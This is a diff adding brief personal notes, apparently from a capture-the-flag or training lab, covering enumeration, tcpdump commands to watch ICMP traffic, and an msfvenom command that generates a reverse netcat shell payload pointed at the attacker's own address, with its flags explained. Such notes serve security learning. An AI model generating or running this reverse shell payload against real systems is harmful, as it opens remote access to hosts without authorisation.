@@ -1,0 +1,24 @@
+Enumeration
+	Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.
+
+
+
+sudo /usr/share/logstash/bin/logstash
+
+....................................................................
+If using your own machine with the OpenVPN connection, use:
+
+    sudo tcpdump ip proto \\icmp -i tun0
+
+If using the AttackBox, use:
+
+    sudo tcpdump ip proto \\icmp -i ens5
+....................................................................
+
+generate payload using msfvenom
+	msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
+-p = payload
+lhost = our local host IP address (this is your machine's IP address)
+lport = the port to listen on (this is the port on your machine)
+R = export the payload in raw format
+
